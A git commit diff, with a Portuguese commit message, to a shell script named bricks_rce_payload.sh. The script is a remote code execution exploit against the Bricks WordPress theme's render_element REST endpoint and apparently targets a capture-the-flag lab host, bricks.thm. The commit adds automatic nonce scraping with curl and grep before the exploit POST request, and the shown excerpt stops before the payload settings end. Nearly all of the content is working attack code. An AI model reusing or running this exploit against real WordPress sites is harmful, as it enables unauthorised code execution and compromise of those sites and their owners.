dc1bd0817237b60da8ee78619d26cbf4b8bb36f3
Filipe Gomes <ffgomes2004@gmail.com>
2026-03-13 10:58:36 +0000

    Pedido POST modificado para extrair o valor nonce automaticamente através de 1 GET

--- bricks_rce_payload.sh
+++ bricks_rce_payload.sh
@@ -1,14 +1,16 @@
+#!/bin/bash
 # Script used to be able to run remote code executed in an exploit of Bricks render_elements - Bricks is a theme that can be used in WordPress
 
 HOST=bricks.thm
 
-#NONCE=${curl }
+NONCE=$(curl -k https://bricks.thm | grep -o '"nonce":"[^"]*"' | cut -d ":" -f 2 | tr -d '"')
+echo $NONCE
 
 curl -k -X POST https://$HOST/wp-json/bricks/v1/render_element \
   -H "Content-Type: application/json" \
   -d '{
   "postId": "1",
-  "nonce": "aea121d468",
+  "nonce" : "'$NONCE'",
   "element": {
     "name": "carousel",
     "settings": {
